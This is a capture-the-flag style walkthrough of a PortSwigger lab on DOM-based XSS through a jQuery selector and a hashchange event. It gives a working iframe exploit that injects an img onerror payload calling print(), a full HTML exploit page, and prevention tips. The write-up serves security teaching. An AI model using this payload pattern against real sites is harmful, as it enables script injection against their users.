# Lab: DOM XSS in jQuery Selector Sink Using a Hashchange Event

## Lab Description

This lab contains a **DOM-based Cross-Site Scripting (XSS)** vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

**Goal:** Deliver an exploit to the victim that calls the `print()` function in their browser.

**Difficulty:** Apprentice

---

# Solution

## Step 1: Understanding the Vulnerability

The vulnerable code on the home page uses jQuery's `$()` selector to handle `hashchange` events. The `location.hash` value is directly passed to the selector, allowing XSS if an attacker can inject HTML/JavaScript.

### Vulnerable Code

```javascript
$(window).on('hashchange', function() {
    var post = location.hash.slice(1);
    $(post).scrollIntoView();
});
```

If `location.hash` contains something like:

```html
<img src=x onerror=print()>
```

jQuery will parse it as HTML and execute the `onerror` handler.

---

## Step 2: Exploit Strategy

We'll create an iframe that:

1. Loads the lab homepage with a `#` hash.
2. On load, appends a malicious payload (`<img src=x onerror=print()>`) to the hash.
3. Triggers the `hashchange` event.
4. Executes `print()`.

---

## Step 3: Crafting the Exploit

### Malicious iframe

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

Replace `YOUR-LAB-ID` with your actual lab ID (for example: `0a1b2c3d4e5f6g7h8i9j`).

### How It Works

1. Initial URL:

   ```text
   https://YOUR-LAB-ID.web-security-academy.net/#
   ```

2. After the iframe loads:

   ```text
   https://YOUR-LAB-ID.web-security-academy.net/#<img src=x onerror=print()>
   ```

3. The vulnerable jQuery selector processes the hash as HTML.

4. The `onerror` event fires and executes:

   ```javascript
   print();
   ```

---

## Step 4: Delivering the Exploit

1. Open Burp Suite or your browser's Developer Tools.
2. From the lab banner, click **Exploit Server**.
3. In the **Body** section, paste the malicious iframe:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

4. Click **Store** to save the exploit.

---

## Step 5: Testing the Exploit

1. Click **View Exploit**.
2. The browser should trigger the `print()` dialog.

If the print dialog appears, the exploit works. ✅

---

## Step 6: Solving the Lab

1. Return to the Exploit Server.
2. Click **Deliver to Victim**.

The lab will automatically solve and display the success message.

---

# Final Exploit Code (Full HTML)

```html
<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS Exploit - jQuery Selector Sink</title>
</head>
<body>
    <h3>Delivering exploit...</h3>

    <iframe
        src="https://YOUR-LAB-ID.web-security-academy.net/#"
        onload="this.src+='<img src=x onerror=print()>'">
    </iframe>

</body>
</html>
```

Replace `YOUR-LAB-ID` with your actual lab ID.

---

# Key Takeaways

| Concept | Explanation |
|----------|------------|
| jQuery selector sink | `$()` interprets hash content as HTML when it contains angle brackets |
| `hashchange` event | Triggered when `location.hash` changes, enabling DOM-based XSS |
| `onload` + `src` modification | Technique used to append a payload after the page loads |
| `print()` function | Harmless proof-of-concept used to demonstrate XSS |

---

# Prevention

- Avoid passing user-controlled input directly into jQuery selectors.
- Use `document.getElementById()` or `document.querySelector()` with proper sanitization.
- Implement a strict Content Security Policy (CSP).
- Validate and escape `location.hash` before use.

---

# References

- PortSwigger: DOM XSS in jQuery Selector Sink
- jQuery Security Documentation
- DOM-Based XSS Prevention Cheat Sheet
